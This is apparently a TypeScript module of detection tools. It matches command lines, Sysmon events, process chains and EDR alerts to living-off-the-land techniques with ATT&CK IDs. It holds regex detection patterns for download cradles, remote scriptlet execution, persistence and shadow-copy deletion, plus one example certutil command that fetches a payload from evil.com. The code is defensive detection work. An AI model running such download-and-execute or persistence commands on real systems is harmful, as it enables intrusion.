import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { Platform, UnifiedLOLEntry } from "../schema/unified-entry.js";

// ━━━ Command Line Patterns ━━━

interface CommandPattern {
  pattern: RegExp;
  binary: string;
  technique: string;
  attckId: string;
  description: string;
  severity: "low" | "medium" | "high" | "critical";
}

const COMMAND_PATTERNS: CommandPattern[] = [
  // certutil patterns
  { pattern: /certutil\s+.*-urlcache/i, binary: "certutil", technique: "File Download", attckId: "T1105", description: "certutil used to download file via URL cache", severity: "high" },
  { pattern: /certutil\s+.*-(decode|encode)/i, binary: "certutil", technique: "Encode/Decode", attckId: "T1140", description: "certutil used for base64 encode/decode", severity: "medium" },
  { pattern: /certutil\s+.*-hashfile/i, binary: "certutil", technique: "Hash Verification", attckId: "T1140", description: "certutil used for file hashing (potentially verifying dropped payload)", severity: "low" },

  // powershell patterns
  { pattern: /powershell\s+.*-enc\b/i, binary: "powershell", technique: "Encoded Command", attckId: "T1059.001", description: "PowerShell executing encoded/obfuscated command", severity: "high" },
  { pattern: /powershell\s+.*-nop\b/i, binary: "powershell", technique: "No Profile Execution", attckId: "T1059.001", description: "PowerShell running with no profile (common in attack scripts)", severity: "medium" },
  { pattern: /powershell\s+.*DownloadString/i, binary: "powershell", technique: "Download Cradle", attckId: "T1105", description: "PowerShell download cradle for remote payload", severity: "critical" },
  { pattern: /powershell\s+.*DownloadFile/i, binary: "powershell", technique: "File Download", attckId: "T1105", description: "PowerShell downloading file to disk", severity: "high" },
  { pattern: /powershell\s+.*Invoke-Expression/i, binary: "powershell", technique: "Dynamic Execution", attckId: "T1059.001", description: "PowerShell IEX for dynamic code execution", severity: "critical" },
  { pattern: /powershell\s+.*\bIEX\b/i, binary: "powershell", technique: "Dynamic Execution", attckId: "T1059.001", description: "PowerShell IEX shorthand for dynamic execution", severity: "critical" },
  { pattern: /powershell\s+.*-w\s+hidden/i, binary: "powershell", technique: "Hidden Window", attckId: "T1059.001", description: "PowerShell running with hidden window", severity: "high" },
  { pattern: /powershell\s+.*bypass/i, binary: "powershell", technique: "Execution Policy Bypass", attckId: "T1059.001", description: "PowerShell bypassing execution policy", severity: "medium" },

  // rundll32 patterns
  { pattern: /rundll32\s+.*javascript:/i, binary: "rundll32", technique: "JavaScript Execution", attckId: "T1218.011", description: "rundll32 executing inline JavaScript", severity: "critical" },
  { pattern: /rundll32\s+.*shell32\.dll.*ShellExec_RunDLL/i, binary: "rundll32", technique: "Shell Execute Proxy", attckId: "T1218.011", description: "rundll32 proxying execution via shell32", severity: "high" },
  { pattern: /rundll32\s+.*url\.dll.*FileProtocolHandler/i, binary: "rundll32", technique: "URL Handler Proxy", attckId: "T1218.011", description: "rundll32 using URL protocol handler for execution", severity: "high" },
  { pattern: /rundll32\.exe\s+[A-Z]:\\(?!Windows)/i, binary: "rundll32", technique: "DLL Proxy Execution", attckId: "T1218.011", description: "rundll32 loading DLL from non-system path", severity: "high" },

  // regsvr32 patterns
  { pattern: /regsvr32\s+.*\/i:http/i, binary: "regsvr32", technique: "Squiblydoo", attckId: "T1218.010", description: "regsvr32 fetching and executing remote SCT scriptlet", severity: "critical" },
  { pattern: /regsvr32\s+.*scrobj\.dll/i, binary: "regsvr32", technique: "COM Scriptlet", attckId: "T1218.010", description: "regsvr32 loading COM scriptlet via scrobj.dll", severity: "high" },

  // mshta patterns
  { pattern: /mshta\s+.*vbscript:/i, binary: "mshta", technique: "Inline VBScript", attckId: "T1218.005", description: "mshta executing inline VBScript", severity: "critical" },
  { pattern: /mshta\s+.*javascript:/i, binary: "mshta", technique: "Inline JavaScript", attckId: "T1218.005", description: "mshta executing inline JavaScript", severity: "critical" },
  { pattern: /mshta\s+https?:\/\//i, binary: "mshta", technique: "Remote HTA", attckId: "T1218.005", description: "mshta loading remote HTA payload", severity: "critical" },

  // bitsadmin patterns
  { pattern: /bitsadmin\s+.*\/transfer/i, binary: "bitsadmin", technique: "BITS Transfer", attckId: "T1197", description: "bitsadmin creating file transfer job", severity: "high" },
  { pattern: /bitsadmin\s+.*SetNotifyCmdLine/i, binary: "bitsadmin", technique: "BITS Persistence", attckId: "T1197", description: "bitsadmin setting notify command for persistence", severity: "critical" },

  // cmstp patterns
  { pattern: /cmstp\s+.*\/s/i, binary: "cmstp", technique: "CMSTP Bypass", attckId: "T1218.003", description: "cmstp silent installation (UAC/AWL bypass)", severity: "high" },

  // wmic patterns
  { pattern: /wmic\s+.*process\s+call\s+create/i, binary: "wmic", technique: "Remote Process", attckId: "T1047", description: "WMIC creating remote process", severity: "critical" },
  { pattern: /wmic\s+.*\/format:/i, binary: "wmic", technique: "XSL Script", attckId: "T1220", description: "WMIC XSL stylesheet processing for code execution", severity: "critical" },
  { pattern: /wmic\s+.*shadowcopy\s+delete/i, binary: "wmic", technique: "Shadow Copy Deletion", attckId: "T1490", description: "WMIC deleting shadow copies (ransomware indicator)", severity: "critical" },

  // curl/wget patterns
  { pattern: /curl\s+.*-o\s+/i, binary: "curl", technique: "File Download", attckId: "T1105", description: "curl downloading file to disk", severity: "medium" },
  { pattern: /wget\s+.*-O\s+/i, binary: "wget", technique: "File Download", attckId: "T1105", description: "wget downloading file to disk", severity: "medium" },

  // reg patterns
  { pattern: /reg\s+add\s+.*CurrentVersion\\Run/i, binary: "reg", technique: "Registry Persistence", attckId: "T1547.001", description: "Registry Run key modification for persistence", severity: "high" },

  // schtasks patterns
  { pattern: /schtasks\s+.*\/create/i, binary: "schtasks", technique: "Scheduled Task", attckId: "T1053.005", description: "Creating scheduled task for persistence/execution", severity: "high" },

  // msiexec patterns
  { pattern: /msiexec\s+.*\/q.*https?:\/\//i, binary: "msiexec", technique: "Remote MSI Install", attckId: "T1218.007", description: "msiexec quiet-installing remote MSI package", severity: "critical" },
];

// ━━━ Sysmon Event Patterns ━━━

interface SysmonPattern {
  eventId: number;
  eventName: string;
  fields: Record<string, string>;
  technique: string;
  attckId: string;
  description: string;
  severity: "low" | "medium" | "high" | "critical";
}

const SYSMON_PATTERNS: SysmonPattern[] = [
  { eventId: 1, eventName: "Process Create", fields: { Image: "certutil", CommandLine: "-urlcache" }, technique: "certutil Download", attckId: "T1105", description: "certutil process created with download flags", severity: "high" },
  { eventId: 1, eventName: "Process Create", fields: { Image: "powershell", CommandLine: "-enc" }, technique: "Encoded PowerShell", attckId: "T1059.001", description: "PowerShell with encoded command argument", severity: "high" },
  { eventId: 1, eventName: "Process Create", fields: { Image: "mshta", CommandLine: "vbscript:" }, technique: "mshta Inline Script", attckId: "T1218.005", description: "mshta executing inline VBScript", severity: "critical" },
  { eventId: 1, eventName: "Process Create", fields: { Image: "regsvr32", CommandLine: "scrobj.dll" }, technique: "Squiblydoo", attckId: "T1218.010", description: "regsvr32 loading COM scriptlet", severity: "critical" },
  { eventId: 1, eventName: "Process Create", fields: { ParentImage: "mshta", Image: "powershell" }, technique: "HTA to PowerShell", attckId: "T1218.005", description: "mshta spawning PowerShell (common attack chain)", severity: "critical" },
  { eventId: 1, eventName: "Process Create", fields: { ParentImage: "wscript", Image: "powershell" }, technique: "VBS to PowerShell", attckId: "T1059.005", description: "wscript spawning PowerShell", severity: "high" },
  { eventId: 3, eventName: "Network Connection", fields: { Image: "certutil" }, technique: "certutil Network", attckId: "T1105", description: "certutil making outbound network connection", severity: "high" },
  { eventId: 3, eventName: "Network Connection", fields: { Image: "mshta" }, technique: "mshta Network", attckId: "T1218.005", description: "mshta making outbound network connection", severity: "high" },
  { eventId: 3, eventName: "Network Connection", fields: { Image: "regsvr32" }, technique: "regsvr32 Network", attckId: "T1218.010", description: "regsvr32 making outbound network connection (Squiblydoo)", severity: "critical" },
  { eventId: 7, eventName: "Image Loaded", fields: { Image: "rundll32", ImageLoaded: "amsi.dll" }, technique: "AMSI Load in rundll32", attckId: "T1218.011", description: "rundll32 loading AMSI (scripting content execution)", severity: "medium" },
  { eventId: 11, eventName: "File Create", fields: { Image: "certutil" }, technique: "certutil File Write", attckId: "T1105", description: "certutil creating file (likely downloaded payload)", severity: "high" },
  { eventId: 13, eventName: "Registry Value Set", fields: { TargetObject: "CurrentVersion\\\\Run" }, technique: "Registry Persistence", attckId: "T1547.001", description: "Registry Run key modified for persistence", severity: "high" },
];

// ━━━ Process Tree Patterns ━━━

interface ProcessTreePattern {
  name: string;
  chain: string[];
  attckIds: string[];
  description: string;
  severity: "medium" | "high" | "critical";
}

const PROCESS_TREE_PATTERNS: ProcessTreePattern[] = [
  { name: "Office Macro Chain", chain: ["winword.exe", "cmd.exe", "powershell.exe"], attckIds: ["T1204.002", "T1059.003", "T1059.001"], description: "Word document macro executing cmd then PowerShell (classic macro malware chain)", severity: "critical" },
  { name: "HTA Dropper Chain", chain: ["mshta.exe", "powershell.exe"], attckIds: ["T1218.005", "T1059.001"], description: "mshta spawning PowerShell for second-stage execution", severity: "critical" },
  { name: "Squiblydoo Chain", chain: ["regsvr32.exe", "scrobj.dll"], attckIds: ["T1218.010"], description: "regsvr32 loading scriptlet object for AWL bypass", severity: "critical" },
  { name: "VBS Dropper Chain", chain: ["wscript.exe", "powershell.exe"], attckIds: ["T1059.005", "T1059.001"], description: "VBScript host spawning PowerShell stager", severity: "high" },
  { name: "Certutil Download Chain", chain: ["cmd.exe", "certutil.exe"], attckIds: ["T1059.003", "T1105"], description: "cmd executing certutil for file download", severity: "high" },
  { name: "BITS Persistence Chain", chain: ["cmd.exe", "bitsadmin.exe"], attckIds: ["T1059.003", "T1197"], description: "cmd configuring BITS job for download/persistence", severity: "high" },
  { name: "Rundll32 Proxy Chain", chain: ["explorer.exe", "rundll32.exe"], attckIds: ["T1218.011"], description: "Explorer spawning rundll32 (potential DLL sideload or proxy execution)", severity: "medium" },
  { name: "WMI Lateral Movement", chain: ["wmiprvse.exe", "cmd.exe", "powershell.exe"], attckIds: ["T1047", "T1059.003", "T1059.001"], description: "WMI provider host spawning cmd/PowerShell (remote execution indicator)", severity: "critical" },
  { name: "CMSTP UAC Bypass", chain: ["cmstp.exe", "cmd.exe"], attckIds: ["T1218.003", "T1059.003"], description: "CMSTP spawning cmd (UAC bypass technique)", severity: "high" },
  { name: "MSIExec Proxy Chain", chain: ["msiexec.exe", "cmd.exe"], attckIds: ["T1218.007", "T1059.003"], description: "msiexec spawning cmd (potentially malicious MSI install)", severity: "high" },
  { name: "Excel Macro Chain", chain: ["excel.exe", "cmd.exe", "powershell.exe"], attckIds: ["T1204.002", "T1059.003", "T1059.001"], description: "Excel macro executing cmd then PowerShell", severity: "critical" },
  { name: "Scheduled Task Execution", chain: ["svchost.exe", "cmd.exe"], attckIds: ["T1053.005", "T1059.003"], description: "Task Scheduler service spawning cmd (scheduled task execution)", severity: "medium" },
];

// ━━━ EDR Alert Patterns ━━━

interface EDRAlertPattern {
  keywords: string[];
  technique: string;
  attckId: string;
  binary: string;
  description: string;
  severity: "low" | "medium" | "high" | "critical";
}

const EDR_ALERT_PATTERNS: EDRAlertPattern[] = [
  { keywords: ["certutil", "download", "urlcache"], technique: "certutil Download", attckId: "T1105", binary: "certutil", description: "certutil used for file download via URL cache", severity: "high" },
  { keywords: ["certutil", "decode", "base64"], technique: "certutil Decode", attckId: "T1140", binary: "certutil", description: "certutil used for base64 decoding", severity: "medium" },
  { keywords: ["powershell", "encoded", "command"], technique: "Encoded PowerShell", attckId: "T1059.001", binary: "powershell", description: "PowerShell executing encoded command", severity: "high" },
  { keywords: ["powershell", "download", "cradle"], technique: "Download Cradle", attckId: "T1105", binary: "powershell", description: "PowerShell download cradle detected", severity: "critical" },
  { keywords: ["mshta", "script", "execution"], technique: "mshta Script", attckId: "T1218.005", binary: "mshta", description: "mshta executing script content", severity: "high" },
  { keywords: ["regsvr32", "scriptlet", "squiblydoo"], technique: "Squiblydoo", attckId: "T1218.010", binary: "regsvr32", description: "regsvr32 Squiblydoo technique detected", severity: "critical" },
  { keywords: ["rundll32", "suspicious", "dll"], technique: "rundll32 Proxy", attckId: "T1218.011", binary: "rundll32", description: "rundll32 loading suspicious DLL", severity: "high" },
  { keywords: ["bitsadmin", "transfer", "download"], technique: "BITS Transfer", attckId: "T1197", binary: "bitsadmin", description: "bitsadmin used for file transfer", severity: "high" },
  { keywords: ["wmic", "process", "create"], technique: "WMI Execution", attckId: "T1047", binary: "wmic", description: "WMIC used for remote process creation", severity: "critical" },
  { keywords: ["cmstp", "bypass", "uac"], technique: "CMSTP Bypass", attckId: "T1218.003", binary: "cmstp", description: "CMSTP used for UAC bypass", severity: "high" },
  { keywords: ["lolbin", "abuse", "proxy"], technique: "LOL Binary Abuse", attckId: "T1218", binary: "unknown", description: "Generic LOL binary proxy execution detected", severity: "high" },
  { keywords: ["application", "whitelisting", "bypass"], technique: "AWL Bypass", attckId: "T1218", binary: "unknown", description: "Application whitelisting bypass attempt", severity: "critical" },
  { keywords: ["scheduled", "task", "persistence"], technique: "Scheduled Task", attckId: "T1053.005", binary: "schtasks", description: "Suspicious scheduled task created for persistence", severity: "high" },
  { keywords: ["registry", "run", "persistence"], technique: "Registry Persistence", attckId: "T1547.001", binary: "reg", description: "Registry Run key modified for persistence", severity: "high" },
];

// ━━━ Helper Functions ━━━

function deduplicateByBinary(entries: UnifiedLOLEntry[]): UnifiedLOLEntry[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    const key = `${e.binary}-${e.platform}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}

function summarizeKbEntry(e: UnifiedLOLEntry): Record<string, unknown> {
  return {
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealthScore: e.stealthScore,
    attck: e.attckTechniques,
    commands: e.executionContexts.slice(0, 2).map(c => ({
      context: c.context,
      command: c.command,
    })),
  };
}

function extractBinaryFromCommandLine(cmdLine: string): string | null {
  // Try to extract binary name from command line
  const normalized = cmdLine.trim().toLowerCase();
  const match = normalized.match(/^(?:[a-z]:\\[^\s]*\\)?(\w+(?:\.exe)?)/);
  if (match) return match[1].replace(/\.exe$/, "");

  // Try common binary names
  const knownBinaries = [
    "certutil", "powershell", "pwsh", "cmd", "mshta", "regsvr32", "rundll32",
    "bitsadmin", "cmstp", "wmic", "wscript", "cscript", "msiexec", "curl",
    "wget", "schtasks", "reg", "sc", "net", "nltest",
  ];
  for (const bin of knownBinaries) {
    if (normalized.includes(bin)) return bin;
  }
  return null;
}

// ━━━ Tools ━━━

const id_from_commandline: ToolDef = {
  name: "id_from_commandline",
  description: "Parse a command line string and identify which LOL technique it matches, with KB enrichment",
  schema: {
    commandline: z.string().describe("The command line string to analyze (e.g. 'certutil -urlcache -split -f http://evil.com/payload.exe')"),
    platform: z.string().optional().describe("Target platform for KB filtering (linux, windows, macos)"),
  },
  async execute(args: { commandline: string; platform?: string }, ctx: ToolContext): Promise<ToolResult> {
    const cmdLine = args.commandline;
    const matches: Array<{
      technique: string;
      binary: string;
      attckId: string;
      description: string;
      severity: string;
      matchedPattern: string;
    }> = [];

    for (const pattern of COMMAND_PATTERNS) {
      if (pattern.pattern.test(cmdLine)) {
        matches.push({
          technique: pattern.technique,
          binary: pattern.binary,
          attckId: pattern.attckId,
          description: pattern.description,
          severity: pattern.severity,
          matchedPattern: pattern.pattern.source,
        });
      }
    }

    // Extract binary and search KB
    const binary = extractBinaryFromCommandLine(cmdLine);
    let kbEntries: Record<string, unknown>[] = [];
    if (binary) {
      const entries = ctx.knowledgeBase.lookupBinary(binary, args.platform as Platform);
      kbEntries = deduplicateByBinary(entries).slice(0, 10).map(summarizeKbEntry);
    }

    // Also search by keyword for non-standard patterns
    const kwEntries = ctx.knowledgeBase.searchByKeyword(cmdLine.substring(0, 50), args.platform as Platform);

    // Determine overall risk
    const severities = matches.map(m => m.severity);
    const overallRisk = severities.includes("critical") ? "critical"
      : severities.includes("high") ? "high"
      : severities.includes("medium") ? "medium"
      : matches.length > 0 ? "low" : "none";

    return json({
      commandline: cmdLine,
      detectedBinary: binary,
      overallRisk,
      totalMatches: matches.length,
      matches,
      kbEntries,
      keywordMatches: deduplicateByBinary(kwEntries).slice(0, 5).map(summarizeKbEntry),
    });
  },
};

const id_from_sysmon: ToolDef = {
  name: "id_from_sysmon",
  description: "Identify LOL technique from Sysmon event data (event ID and relevant fields)",
  schema: {
    event_id: z.number().describe("Sysmon event ID (e.g. 1 for Process Create, 3 for Network Connection, 7 for Image Loaded)"),
    image: z.string().optional().describe("Process image/binary path from Sysmon event"),
    command_line: z.string().optional().describe("Command line from Sysmon event"),
    parent_image: z.string().optional().describe("Parent process image path"),
    target_object: z.string().optional().describe("Target object (for registry events)"),
    image_loaded: z.string().optional().describe("Loaded image path (for Event ID 7)"),
  },
  async execute(args: {
    event_id: number;
    image?: string;
    command_line?: string;
    parent_image?: string;
    target_object?: string;
    image_loaded?: string;
  }, ctx: ToolContext): Promise<ToolResult> {
    const matches: Array<{
      technique: string;
      attckId: string;
      description: string;
      severity: string;
      matchedFields: Record<string, string>;
    }> = [];

    for (const pattern of SYSMON_PATTERNS) {
      if (pattern.eventId !== args.event_id) continue;

      let matched = true;
      const matchedFields: Record<string, string> = {};

      for (const [field, value] of Object.entries(pattern.fields)) {
        const argField = field === "Image" ? args.image
          : field === "CommandLine" ? args.command_line
          : field === "ParentImage" ? args.parent_image
          : field === "TargetObject" ? args.target_object
          : field === "ImageLoaded" ? args.image_loaded
          : undefined;

        if (!argField || !argField.toLowerCase().includes(value.toLowerCase())) {
          matched = false;
          break;
        }
        matchedFields[field] = value;
      }

      if (matched) {
        matches.push({
          technique: pattern.technique,
          attckId: pattern.attckId,
          description: pattern.description,
          severity: pattern.severity,
          matchedFields,
        });
      }
    }

    // Also run command line analysis if provided
    let cmdLineMatches: Record<string, unknown>[] = [];
    if (args.command_line) {
      for (const pattern of COMMAND_PATTERNS) {
        if (pattern.pattern.test(args.command_line)) {
          cmdLineMatches.push({
            technique: pattern.technique,
            binary: pattern.binary,
            attckId: pattern.attckId,
            severity: pattern.severity,
          });
        }
      }
    }

    // Search KB for the binary
    const binaryName = args.image ? args.image.split(/[/\\]/).pop()?.replace(/\.exe$/i, "") : undefined;
    let kbEntries: Record<string, unknown>[] = [];
    if (binaryName) {
      const entries = ctx.knowledgeBase.lookupBinary(binaryName);
      kbEntries = deduplicateByBinary(entries).slice(0, 5).map(summarizeKbEntry);
    }

    return json({
      sysmonEventId: args.event_id,
      eventName: SYSMON_PATTERNS.find(p => p.eventId === args.event_id)?.eventName || `Event ID ${args.event_id}`,
      totalMatches: matches.length,
      matches,
      commandLineMatches: cmdLineMatches,
      detectedBinary: binaryName,
      kbEntries,
    });
  },
};

const id_from_process_tree: ToolDef = {
  name: "id_from_process_tree",
  description: "Identify LOL attack chain from process tree parent-child relationships",
  schema: {
    process_chain: z.array(z.string()).describe("Ordered list of process names in parent-child chain (e.g. ['winword.exe', 'cmd.exe', 'powershell.exe'])"),
  },
  async execute(args: { process_chain: string[] }, ctx: ToolContext): Promise<ToolResult> {
    const chain = args.process_chain.map(p => p.toLowerCase());
    const matches: Array<{
      patternName: string;
      attckIds: string[];
      description: string;
      severity: string;
      matchedChain: string[];
      matchType: "exact" | "partial" | "subsequence";
    }> = [];

    for (const pattern of PROCESS_TREE_PATTERNS) {
      const patternChain = pattern.chain.map(p => p.toLowerCase());

      // Check exact match
      if (chain.length === patternChain.length && chain.every((p, i) => p.includes(patternChain[i].replace(".exe", "")) || patternChain[i].includes(p.replace(".exe", "")))) {
        matches.push({
          patternName: pattern.name,
          attckIds: pattern.attckIds,
          description: pattern.description,
          severity: pattern.severity,
          matchedChain: pattern.chain,
          matchType: "exact",
        });
        continue;
      }

      // Check subsequence match (pattern is subsequence of input chain)
      let patternIdx = 0;
      for (let i = 0; i < chain.length && patternIdx < patternChain.length; i++) {
        const pName = patternChain[patternIdx].replace(".exe", "");
        const cName = chain[i].replace(".exe", "");
        if (cName.includes(pName) || pName.includes(cName)) {
          patternIdx++;
        }
      }

      if (patternIdx === patternChain.length) {
        matches.push({
          patternName: pattern.name,
          attckIds: pattern.attckIds,
          description: pattern.description,
          severity: pattern.severity,
          matchedChain: pattern.chain,
          matchType: chain.length === patternChain.length ? "exact" : "subsequence",
        });
      }
    }

    // Search KB for each binary in chain
    const chainKBEntries: Record<string, Record<string, unknown>[]> = {};
    for (const proc of args.process_chain) {
      const binName = proc.replace(/\.exe$/i, "");
      const entries = ctx.knowledgeBase.lookupBinary(binName);
      if (entries.length > 0) {
        chainKBEntries[binName] = deduplicateByBinary(entries).slice(0, 3).map(summarizeKbEntry);
      }
    }

    // Determine overall risk
    const severities = matches.map(m => m.severity);
    const overallRisk = severities.includes("critical") ? "critical"
      : severities.includes("high") ? "high"
      : severities.includes("medium") ? "medium"
      : matches.length > 0 ? "low" : "none";

    return json({
      processChain: args.process_chain,
      overallRisk,
      totalMatches: matches.length,
      matches,
      chainKBEntries,
    });
  },
};

const id_from_edr_alert: ToolDef = {
  name: "id_from_edr_alert",
  description: "Identify LOL technique from EDR alert text by matching keywords and patterns",
  schema: {
    alert_text: z.string().describe("EDR alert description/title text to analyze"),
    edr_vendor: z.string().optional().describe("EDR vendor name for context (e.g. CrowdStrike, SentinelOne, Defender)"),
  },
  async execute(args: { alert_text: string; edr_vendor?: string }, ctx: ToolContext): Promise<ToolResult> {
    const alertLower = args.alert_text.toLowerCase();
    const matches: Array<{
      technique: string;
      binary: string;
      attckId: string;
      description: string;
      severity: string;
      matchedKeywords: string[];
    }> = [];

    for (const pattern of EDR_ALERT_PATTERNS) {
      const matched = pattern.keywords.filter(kw => alertLower.includes(kw.toLowerCase()));
      // Require at least 2 keyword matches to reduce false positives
      if (matched.length >= 2) {
        matches.push({
          technique: pattern.technique,
          binary: pattern.binary,
          attckId: pattern.attckId,
          description: pattern.description,
          severity: pattern.severity,
          matchedKeywords: matched,
        });
      }
    }

    // Sort by number of matched keywords (most specific first)
    matches.sort((a, b) => b.matchedKeywords.length - a.matchedKeywords.length);

    // Search KB for identified binaries
    const identifiedBinaries = new Set(matches.map(m => m.binary).filter(b => b !== "unknown"));
    const kbEntries: Record<string, Record<string, unknown>[]> = {};
    for (const binary of identifiedBinaries) {
      const entries = ctx.knowledgeBase.lookupBinary(binary);
      if (entries.length > 0) {
        kbEntries[binary] = deduplicateByBinary(entries).slice(0, 3).map(summarizeKbEntry);
      }
    }

    return json({
      alertText: args.alert_text,
      edrVendor: args.edr_vendor || "unknown",
      totalMatches: matches.length,
      matches,
      identifiedBinaries: Array.from(identifiedBinaries),
      kbEntries,
    });
  },
};

export const identifyTechniqueTools: ToolDef[] = [
  id_from_commandline,
  id_from_sysmon,
  id_from_process_tree,
  id_from_edr_alert,
];
